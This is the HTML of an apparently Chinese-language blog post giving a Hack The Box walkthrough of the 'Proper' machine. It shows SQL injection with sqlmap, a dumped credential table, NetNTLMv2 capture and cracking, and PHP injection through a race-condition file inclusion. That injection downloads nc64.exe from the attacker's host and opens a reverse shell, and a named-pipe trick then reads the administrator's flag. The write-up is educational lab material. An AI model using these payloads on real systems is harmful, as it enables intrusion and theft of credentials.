@@ -1,0 +1,813 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+    
+    
+    
+    
+    <title>Proper - Hackthebox | Lucifiel&#39;s Blog | Lucifiel 技术博客</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="Hackthebox">
+    <meta name="description" content="Hackthebox - Proper靶场信息  靶场类型  信息搜集 首先使用Nmap进行信息搜集nmap -A -sS -sC -sV -p- 10.10.10.231  ┌──(root💀root)-[~&#x2F;Desktop] └─# nmap -A -sS -sC -sV -p- 10.10.10.231 Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Proper - Hackthebox">
+<meta property="og:url" content="http://www.lucifiel.com/2021/07/11/Hackthebox/Hackthebox-Proper/index.html">
+<meta property="og:site_name" content="Lucifiel&#39;s Blog">
+<meta property="og:description" content="Hackthebox - Proper靶场信息  靶场类型  信息搜集 首先使用Nmap进行信息搜集nmap -A -sS -sC -sV -p- 10.10.10.231  ┌──(root💀root)-[~&#x2F;Desktop] └─# nmap -A -sS -sC -sV -p- 10.10.10.231 Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://www.lucifiel.com/2021/07/11/Hackthebox/Hackthebox-Proper/image1.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/07/11/Hackthebox/Hackthebox-Proper/image2.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/07/11/Hackthebox/Hackthebox-Proper/image3.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/07/11/Hackthebox/Hackthebox-Proper/image4.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/07/11/Hackthebox/Hackthebox-Proper/image5.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/07/11/Hackthebox/Hackthebox-Proper/image6.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/07/11/Hackthebox/Hackthebox-Proper/image7.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/07/11/Hackthebox/Hackthebox-Proper/image8.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/07/11/Hackthebox/Hackthebox-Proper/image9.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/07/11/Hackthebox/Hackthebox-Proper/image10.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/07/11/Hackthebox/Hackthebox-Proper/image11.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/07/11/Hackthebox/Hackthebox-Proper/image12.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/07/11/Hackthebox/Hackthebox-Proper/image13.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/07/11/Hackthebox/Hackthebox-Proper/image14.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/07/11/Hackthebox/Hackthebox-Proper/image15.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/07/11/Hackthebox/Hackthebox-Proper/image16.png">
+<meta property="article:published_time" content="2021-07-11T11:38:36.000Z">
+<meta property="article:modified_time" content="2023-06-13T03:49:28.194Z">
+<meta property="article:author" content="Lucifiel">
+<meta property="article:tag" content="Hackthebox">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://www.lucifiel.com/2021/07/11/Hackthebox/Hackthebox-Proper/image1.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="Lucifiel&#39;s Blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.1"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
+
+<body>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Lucifiel</h5>
+          <a href="mailto:LucifielHack@qq.com" title="LucifielHack@qq.com" class="mail">LucifielHack@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/LucifielHack" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                About
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">Proper - Hackthebox</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">Proper - Hackthebox</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2021-07-11T11:38:36.000Z" itemprop="datePublished" class="page-time">
+  2021-07-11
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Hackthebox-Proper"><span class="post-toc-text">Hackthebox - Proper</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#靶场信息"><span class="post-toc-text">靶场信息</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#靶场类型"><span class="post-toc-text">靶场类型</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#信息搜集-首先使用Nmap进行信息搜集"><span class="post-toc-text">信息搜集 首先使用Nmap进行信息搜集</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#漏洞利用"><span class="post-toc-text">漏洞利用</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Analysis-of-client-exe"><span class="post-toc-text">Analysis of client.exe</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Analysis-of-server-exe-Suppose-we-replicate-the-behaviors-of-client-exe-and-server-exe-in-a-Windows-10-installation-This-is-what-we-have-determined-above"><span class="post-toc-text">Analysis of server.exe Suppose we replicate the behaviors of client.exe and server.exe in a Windows 10 installation. This is what we have determined above</span></a></li></ol></li></ol></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-Hackthebox/Hackthebox-Proper"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">Proper - Hackthebox</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2021-07-11 19:38:36" datetime="2021-07-11T11:38:36.000Z"  itemprop="datePublished">2021-07-11</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="Hackthebox-Proper"><a href="#Hackthebox-Proper" class="headerlink" title="Hackthebox - Proper"></a>Hackthebox - Proper</h1><h2 id="靶场信息"><a href="#靶场信息" class="headerlink" title="靶场信息"></a>靶场信息</h2><img src="/2021/07/11/Hackthebox/Hackthebox-Proper/image1.png" class>
+
+<h2 id="靶场类型"><a href="#靶场类型" class="headerlink" title="靶场类型"></a>靶场类型</h2><img src="/2021/07/11/Hackthebox/Hackthebox-Proper/image2.png" class>
+
+<h2 id="信息搜集-首先使用Nmap进行信息搜集"><a href="#信息搜集-首先使用Nmap进行信息搜集" class="headerlink" title="信息搜集 首先使用Nmap进行信息搜集"></a>信息搜集 首先使用Nmap进行信息搜集</h2><pre><code class="Plain">nmap -A -sS -sC -sV -p- 10.10.10.231
+</code></pre>
+<pre><code class="Plain">┌──(root💀root)-[~/Desktop]
+└─# nmap -A -sS -sC -sV -p- 10.10.10.231
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-10 13:09 CST
+Nmap scan report for 10.10.10.231
+Host is up (0.24s latency).
+Not shown: 65534 filtered ports
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Microsoft IIS httpd 10.0
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: OS Tidy Inc.
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
+No OS matches for host
+Network Distance: 2 hops
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT       ADDRESS
+1   240.14 ms 10.10.14.1
+2   240.16 ms 10.10.10.231
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 389.51 seconds
+</code></pre>
+<p>从nmap扫描我们可以得到的信息有 - 本台靶机开启了80端口 - 本台靶机使用了IIS 10.0作为Web服务器 - 本台靶机是Windows系统</p>
+<p>这台靶机只开启了80端口，那这应该就是我们唯一的突破口了，让我们先来访问一下看看吧</p>
+<p>在主页面我们没发现什么有趣的东西，那就先FUZZ一下目录看看吧</p>
+<pre><code class="Plain">gobuster dir -u http://10.10.10.231/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt -t 50
+</code></pre>
+<pre><code class="Plain">┌──(root💀root)-[~/Desktop]
+└─# gobuster dir -u http://10.10.10.231/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt -t 200
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.10.231/
+[+] Method:                  GET
+[+] Threads:                 200
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              php,html,txt
+[+] Timeout:                 10s
+===============================================================
+2021/07/10 14:01:21 Starting gobuster in directory enumeration mode
+===============================================================
+/Index.html           (Status: 200) [Size: 14257]
+/assets               (Status: 301) [Size: 150] [--&gt; http://10.10.10.231/assets/]
+/functions.php        (Status: 200) [Size: 0]
+/index.html           (Status: 200) [Size: 14257]
+/index.html           (Status: 200) [Size: 14257]
+/licenses             (Status: 301) [Size: 152] [--&gt; http://10.10.10.231/licenses/]
+
+===============================================================
+2021/07/10 14:01:46 Finished
+===============================================================
+</code></pre>
+<p>我们发现了两个目录<code>assets</code>、<code>licenses</code>和一个文件<code>functions.php</code></p>
+<p>咱们把这两个目录继续fuzz，然后去看看这个php文件里有什么</p>
+<pre><code class="Plain">http://10.10.10.231/
+    index.php
+    functions.php
+    /assets
+        /api
+        /css
+        /fonts
+        /img
+        /js
+    /licenses
+        index.php
+        logout.php
+        licenses.php
+</code></pre>
+<p>访问后发现，<code>functions.php</code>是空白页面，没有可访问的内容。访问<code>/assets</code>和<code>/assets/api</code>都是返回404，暂时无法访问。而访问<code>/licenses</code>后，是一个登录页面，访问<code>/licenses/licenses.php</code>会跳转到<code>/licenses/index.php</code>页面</p>
+<p>在<code>http://10.10.10.231/index.php</code>网页源代码的时候，找到了两个有意思的东西</p>
+<img src="/2021/07/11/Hackthebox/Hackthebox-Proper/image3.png" class>
+
+<p>四个用户名 - dustin - daksh - anna - wafer</p>
+<img src="/2021/07/11/Hackthebox/Hackthebox-Proper/image4.png" class>
+
+<p>一段URL，咱们访问一下试试</p>
+<pre><code class="Plain">http://10.10.10.231/products-ajax.php?order=id+desc&amp;h=a1b30d31d344a5a4e41e8496ccbdd26b
+</code></pre>
+<p>访问后发现是index.php页面的商店功能</p>
+<p>测试后发现，上述url中，缺少了order或者h这两个任意一个参数，都会得到如下报错</p>
+<p>我有点好奇这段hash的内容是什么，咱们使用john给它解密一下</p>
+<p>测试得到HASH算法</p>
+<pre><code class="Plain">Hash = md5(Salt+Payload)
+</code></pre>
+<pre><code class="Plain">┌──(root💀root)-[~/Desktop]
+└─# john hash --wordlist=/usr/share/wordlists/rockyou.txt
+Warning: detected hash type &quot;LM&quot;, but the string is also recognized as &quot;dynamic=md5($p)&quot;
+Use the &quot;--format=dynamic=md5($p)&quot; option to force loading these as that type instead
+Warning: detected hash type &quot;LM&quot;, but the string is also recognized as &quot;HAVAL-128-4&quot;
+Use the &quot;--format=HAVAL-128-4&quot; option to force loading these as that type instead
+Warning: detected hash type &quot;LM&quot;, but the string is also recognized as &quot;MD2&quot;
+Use the &quot;--format=MD2&quot; option to force loading these as that type instead
+Warning: detected hash type &quot;LM&quot;, but the string is also recognized as &quot;mdc2&quot;
+Use the &quot;--format=mdc2&quot; option to force loading these as that type instead
+Warning: detected hash type &quot;LM&quot;, but the string is also recognized as &quot;mscash&quot;
+Use the &quot;--format=mscash&quot; option to force loading these as that type instead
+Warning: detected hash type &quot;LM&quot;, but the string is also recognized as &quot;mscash2&quot;
+Use the &quot;--format=mscash2&quot; option to force loading these as that type instead
+Warning: detected hash type &quot;LM&quot;, but the string is also recognized as &quot;NT&quot;
+Use the &quot;--format=NT&quot; option to force loading these as that type instead
+Warning: detected hash type &quot;LM&quot;, but the string is also recognized as &quot;Raw-MD4&quot;
+Use the &quot;--format=Raw-MD4&quot; option to force loading these as that type instead
+Warning: detected hash type &quot;LM&quot;, but the string is also recognized as &quot;Raw-MD5&quot;
+Use the &quot;--format=Raw-MD5&quot; option to force loading these as that type instead
+Warning: detected hash type &quot;LM&quot;, but the string is also recognized as &quot;Raw-MD5u&quot;
+Use the &quot;--format=Raw-MD5u&quot; option to force loading these as that type instead
+Warning: detected hash type &quot;LM&quot;, but the string is also recognized as &quot;Raw-SHA1-AxCrypt&quot;
+Use the &quot;--format=Raw-SHA1-AxCrypt&quot; option to force loading these as that type instead
+Warning: detected hash type &quot;LM&quot;, but the string is also recognized as &quot;ripemd-128&quot;
+Use the &quot;--format=ripemd-128&quot; option to force loading these as that type instead
+Warning: detected hash type &quot;LM&quot;, but the string is also recognized as &quot;Snefru-128&quot;
+Use the &quot;--format=Snefru-128&quot; option to force loading these as that type instead
+Warning: detected hash type &quot;LM&quot;, but the string is also recognized as &quot;ZipMonster&quot;
+Use the &quot;--format=ZipMonster&quot; option to force loading these as that type instead
+Using default input encoding: UTF-8
+Using default target encoding: CP850
+Loaded 2 password hashes with no different salts (LM [DES 256/256 AVX2])
+Warning: poor OpenMP scalability for this hash type, consider --fork=2
+Will run 2 OpenMP threads
+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+0g 0:00:00:01 DONE (2021-07-10 14:44) 0g/s 9808Kp/s 9808Kc/s 19617KC/s !!LIVER..*7¡VA
+Session completed
+</code></pre>
+<p>看到这里，突然就想通为什么会把这段hash插入到order里了</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>使用如下命令进行注入</p>
+<pre><code class="Plain">sqlmap -u &quot;http://10.10.10.231/products-ajax.php?order=id+desc&amp;h=a1b30d31d344a5a4e41e8496ccbdd26b&quot; --eval=&quot;import hashlib ; h=hashlib.md5((&#39;hie0shah6ooNoim&#39;+order).encode(&#39;utf-8&#39;)).hexdigest()&quot;  --batch --threads=10 -D cleaner -T customers -C id,login,password --dump
+</code></pre>
+<p>得到了结果</p>
+<pre><code class="Plain">+----+------------------------------+----------------------------------------------+
+| id | login                        | password                                     |
++----+------------------------------+----------------------------------------------+
+| 1  | vikki.solomon@throwaway.mail | 7c6a180b36896a0a8c02787eeafb0e4c (password1) |
+| 2  | nstone@trashbin.mail         | 6cb75f652a9b52798eb6cf2201057c73 (password2) |
+| 3  | bmceachern7@discovery.moc    | e10adc3949ba59abbe56e057f20f883e (123456)    |
+| 4  | jkleiser8@google.com.xy      | 827ccb0eea8a706c4c34a16891f84e7b (12345)     |
+| 5  | mchasemore9@sitemeter.moc    | 25f9e794323b453885f5181f1b624d0b (123456789) |
+| 6  | gdornina@marriott.moc        | 5f4dcc3b5aa765d61d8327deb882cf99 (password)  |
+| 7  | itootellb@forbes.moc         | f25a2fc72690b780b2a14e140ef6a9e0 (iloveyou)  |
+| 8  | kmanghamc@state.tx.su        | 8afa847f50a716e64932d995c8e7435a (princess)  |
+| 9  | jblinded@bing.moc            | fcea920f7412b5da7be0cf42b8c93759 (1234567)   |
+| 10 | llenchenkoe@macromedia.moc   | f806fc5a2a0d5ba2471600758452799c (rockyou)   |
+| 11 | aaustinf@booking.moc         | 25d55ad283aa400af464c76d713c07ad (12345678)  |
+| 12 | afeldmesserg@ameblo.pj       | e99a18c428cb38d5f260853678922e03 (abc123)    |
+| 13 | ahuntarh@seattletimes.moc    | fc63f87c08d505264caba37514cd0cfd (nicole)    |
+| 14 | talelsandrovichi@tamu.ude    | aa47f8215c6f30a0dcdb2a36a9f4168e (daniel)    |
+| 15 | ishayj@dmoz.gro              | 67881381dbc68d4761230131ae0008f7 (babygirl)  |
+| 16 | acallabyk@un.gro             | d0763edaa9d9bd2a9516280e9044d885 (monkey)    |
+| 17 | daeryl@about.you             | 061fba5bdfc076bb7362616668de87c8 (lovely)    |
+| 18 | aalekseicikm@skyrock.moc     | aae039d6aa239cfc121357a825210fa3 (jessica)   |
+| 19 | lginmann@lycos.moc           | c33367701511b4f6020ec61ded352059 (654321)    |
+| 20 | lgiorioo@ow.lic              | 0acf4539a14b3aa27deeb4cbdf6e989f (michael)   |
+| 21 | lbyshp@wired.moc             | adff44c5102fca279fce7559abf66fee (ashley)    |
+| 22 | bklewerq@yelp.moc            | d8578edf8458ce06fbc5bb76a58c5ca4 (qwerty)    |
+| 23 | wstrettellr@senate.gov       | 96e79218965eb72c92a549dd5a330112 (111111)    |
+| 24 | lodorans@kickstarter.moc     | edbd0effac3fcc98e725920a512881e0 (iloveu)    |
+| 25 | bpfeffelt@artisteer.moc      | 670b14728ad9902aecba32e22fa4f6bd (000000)    |
+| 26 | lgrimsdellu@abc.net.uvw      | 2345f10bb948c5665ef91f6773b3e455 (michelle)  |
+| 27 | lpealingv@goo.goo            | f78f2477e949bee2d12a2c540fb6084f (tigger)    |
+| 28 | krussenw@mit.ude             | 0571749e2ac330a7455809c6b0e7af90 (sunshine)  |
+| 29 | meastmondx@businessweek.moc  | c378985d629e99a4e86213db0cd5e70d (chocolate) |
++----+------------------------------+----------------------------------------------+
+</code></pre>
+<p>随便选择一个账号进行登录</p>
+<img src="/2021/07/11/Hackthebox/Hackthebox-Proper/image5.png" class>
+
+<p>登入后，在源码处发现了有趣的东西</p>
+<p>咱们把theme更改为<code>..</code>并生成相对应的hash值</p>
+<pre><code class="Plain">http://10.10.10.231/licenses/licenses.php?theme=..&amp;h=c5427f8e0865273f4a62c614adec0985
+</code></pre>
+<p>hash生成脚本</p>
+<pre><code class="Plain">import hashlib
+
+m = hashlib.md5()
+# b&quot;hie0shah6ooNoim后边的`..`就是我们的自定义payload
+m.update(b&quot;hie0shah6ooNoim..&quot;)
+
+print(m.hexdigest())
+</code></pre>
+<p>发现注释里有一些描述</p>
+<p>咱们尝试一下<code>RFI(Remote File Inclusion 远程文件包含)</code></p>
+<p>使用python自带的<code>smbserver.py</code>模块开启一个虚假的smb服务</p>
+<pre><code class="Plain">python3 /usr/share/doc/python3-impacket/examples/smbserver.py -ip 10.10.14.24 -smb2support evil .
+</code></pre>
+<pre><code class="Plain">http://10.10.10.231/licenses/licenses.php?theme=//10.10.14.24&amp;h=288af3998fba7f4c3fd8e58be73b26ae
+</code></pre>
+<pre><code class="Plain">┌──(root💀root)-[~/Desktop]
+└─# python3 /usr/share/doc/python3-impacket/examples/smbserver.py -ip 10.10.14.24 -smb2support evil .
+Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+[*] Incoming connection (10.10.10.231,51415)
+[*] AUTHENTICATE_MESSAGE (PROPER\web,PROPER)
+[*] User PROPER\web authenticated successfully
+[*] web::PROPER:4141414141414141:e73cd0da1ecd6a53908ce1117b61d53c:010100000000000000379e157675d70156bee2cc93aced8e000000000100100054006e00520063006e006a006e0063000300100054006e00520063006e006a006e0063000200100055004500650052004a004e006f004f000400100055004500650052004a004e006f004f000700080000379e157675d70106000400020000000800300030000000000000000000000000200000cc94dbb5a4a8ccad357314b70a1060b2abd390224562589501139c5005a818470a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00320034000000000000000000
+[*] Handle: &#39;ConnectionResetError&#39; object is not subscriptable
+[*] Closing down connection (10.10.10.231,51415)
+[*] Remaining connections []
+</code></pre>
+<p>成功获取到一个hash，咱们丢到john里进行破解</p>
+<pre><code class="Plain">┌──(root💀root)-[~/Desktop]
+└─# john --show --format=netntlmv2 hash
+web:charlotte123!:PROPER:4141414141414141:e73cd0da1ecd6a53908ce1117b61d53c:010100000000000000379e157675d70156bee2cc93aced8e000000000100100054006e00520063006e006a006e0063000300100054006e00520063006e006a006e0063000200100055004500650052004a004e006f004f000400100055004500650052004a004e006f004f000700080000379e157675d70106000400020000000800300030000000000000000000000000200000cc94dbb5a4a8ccad357314b70a1060b2abd390224562589501139c5005a818470a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00320034000000000000000000
+
+1 password hash cracked, 0 left
+</code></pre>
+<p>成功获得了一个账户密码</p>
+<pre><code class="Plain">username = web
+password = charlotte123!
+</code></pre>
+<p>使用账号密码重新执行smb服务</p>
+<pre><code class="Plain">python3 /usr/share/doc/python3-impacket/examples/smbserver.py -ip 10.10.14.24 -username web -password charlotte123! -smb2support eval .
+</code></pre>
+<p>在本地编写一个条件竞争的sh脚本，保存为<code>race.sh</code></p>
+<pre><code class="Plain">#!/bin/bash
+PAYLOAD=$1
+while :; do
+    echo hello world &gt; header.inc
+    echo &quot;$PAYLOAD&quot; &gt; header.inc
+done
+</code></pre>
+<p>然后运行脚本</p>
+<pre><code class="Plain">./race.sh &#39;&lt;?php phpinfo(); ?&gt;&#39;
+</code></pre>
+<p>然后再次请求网页</p>
+<pre><code class="Plain">http://10.10.10.231/licenses/licenses.php?theme=//10.10.14.24/evil&amp;h=d1a79488ed1966002feef92cabc0ccc8
+</code></pre>
+<p>成功返回了phpinfo界面</p>
+<img src="/2021/07/11/Hackthebox/Hackthebox-Proper/image6.png" class>
+
+<p>可能一次不行，多刷新几次</p>
+<p>现在咱们在本地放一个<code>netcat.exe</code>，上传到靶机里来反弹shell</p>
+<p>首先使用Python3在本地开启一个http服务器</p>
+<pre><code class="Plain">python3 -m http.server 80
+</code></pre>
+<p>然后运行脚本</p>
+<pre><code class="Plain">./race.sh &#39;&lt;?php system(&quot;cmd /c powershell iwr http://10.10.14.24/nc64.exe -outf \windows\system32\spool\drivers\color\cute.exe&quot;); ?&gt;&#39;
+</code></pre>
+<pre><code class="Plain">┌──(root💀root)-[~/Desktop]
+└─# python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 5555 (http://0.0.0.0:5555/) ...
+10.10.10.231 - - [11/Jul/2021 09:06:05] &quot;GET /nc64.exe HTTP/1.1&quot; 200 -
+</code></pre>
+<p>接收到GET请求就是执行成功了，现在我们使用nc在本地监听一个端口</p>
+<pre><code class="Plain">nc -nvlp 4444
+</code></pre>
+<p>然后利用我们刚才上传的nc64.exe来反弹shell</p>
+<pre><code class="Plain">./race.sh &#39;&lt;?php system(&quot;cmd /c start \windows\system32\spool\drivers\color\cute.exe 10.10.14.24 4444 -e cmd.exe&quot;); ?&gt;&#39;
+</code></pre>
+<img src="/2021/07/11/Hackthebox/Hackthebox-Proper/image7.png" class>
+
+<p>成功弹回shell</p>
+<pre><code class="Plain">c:\Users\web\Desktop&gt;type user.txt
+type user.txt
+48129e580da3dc57a121551b897d1f5a
+</code></pre>
+<p>成功拿到user权限的flag ## 权限提升 进入</p>
+<pre><code class="Plain">c:\Program Files\Cleanup&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is FE0C-A36B
+
+ Directory of c:\Program Files\Cleanup
+
+11/15/2020  05:05 AM    &lt;DIR&gt;          .
+11/15/2020  05:05 AM    &lt;DIR&gt;          ..
+11/15/2020  05:03 AM         2,999,808 client.exe
+11/15/2020  10:22 AM               174 README.md
+11/15/2020  06:20 AM         3,041,792 server.exe
+               3 File(s)      6,041,774 bytes
+               2 Dir(s)   7,353,192,448 bytes free
+</code></pre>
+<p>我在C:Files<code>client.exe</code>和<code>server.exe</code></p>
+<p>这就是咱们提权的突破口了</p>
+<pre><code class="Plain">mklink /j \users\web\downloads\lucifiel \users\administrator\desktop
+</code></pre>
+<p>先做一个链接</p>
+<p>操控管道<code>\\.\pipe\cleanuppipe</code></p>
+<pre><code class="Plain">echo CLEAN \users\web\downloads\lucifiel\root.txtx &gt; \\.\pipe\cleanuppipe
+</code></pre>
+<p>此时Server.exe会通过管道的内容来运行程序, 会将程序加密并移动至<code>\programdata\cleanup</code>(这个程序应该是administrator运行的)</p>
+<p>删掉链接, 创建文件夹, 再还原文件</p>
+<pre><code class="Plain">rmdir \users\web\downloads\lucifiel
+mkdir \users\web\downloads\lucifiel
+echo RESTORE \users\web\downloads\lucifiel\root.txtx &gt; \\.\pipe\cleanuppipe
+type \users\web\downloads\lucifiel\root.txt
+
+9b07cf2c755f11c5545475416fb3a74f
+</code></pre>
+<p>成功获得root权限的flag</p>
+<p>PS：逆向这块儿我不会，我直接抄的答案</p>
+<p>下面贴上我抄的答案的原文</p>
+<h3 id="Analysis-of-client-exe"><a href="#Analysis-of-client-exe" class="headerlink" title="Analysis of client.exe"></a>Analysis of client.exe</h3><p>Reverse engineering of client.exe shows the need to supply an argument in order to “make it do something”.</p>
+<img src="/2021/07/11/Hackthebox/Hackthebox-Proper/image8.png" class>
+
+<p>You can see from above that by supplying a -R and a file path triggers the main_serviceRestore function which in turn calls upon a named pipe client to connect to a named pipe, cleanupPipe.</p>
+<img src="/2021/07/11/Hackthebox/Hackthebox-Proper/image9.png" class>
+
+<p>Further down the control flow graph, this is what’s actually sent across the named pipe.</p>
+<img src="/2021/07/11/Hackthebox/Hackthebox-Proper/image10.png" class>
+
+<h3 id="Analysis-of-server-exe-Suppose-we-replicate-the-behaviors-of-client-exe-and-server-exe-in-a-Windows-10-installation-This-is-what-we-have-determined-above"><a href="#Analysis-of-server-exe-Suppose-we-replicate-the-behaviors-of-client-exe-and-server-exe-in-a-Windows-10-installation-This-is-what-we-have-determined-above" class="headerlink" title="Analysis of server.exe Suppose we replicate the behaviors of client.exe and server.exe in a Windows 10 installation. This is what we have determined above"></a>Analysis of server.exe Suppose we replicate the behaviors of client.exe and server.exe in a Windows 10 installation. This is what we have determined above</h3><img src="/2021/07/11/Hackthebox/Hackthebox-Proper/image11.png" class>
+
+<p>This is what’s displayed in server.exe.</p>
+<img src="/2021/07/11/Hackthebox/Hackthebox-Proper/image12.png" class>
+
+<p>Hmm, where have I seen C:before? By the way, dGVzdA&#x3D;&#x3D; is the base64-encoded string of test. On top of that, this is evidence that a named pipe, cleanupPipe is listening for data.</p>
+<img src="/2021/07/11/Hackthebox/Hackthebox-Proper/image13.png" class>
+
+<p>We can send our own data to server.exe with good ol’ command prompt using the echo command like so.</p>
+<img src="/2021/07/11/Hackthebox/Hackthebox-Proper/image14.png" class>
+
+<p>Meanwhile in server.exe, I see this…</p>
+<img src="/2021/07/11/Hackthebox/Hackthebox-Proper/image15.png" class>
+
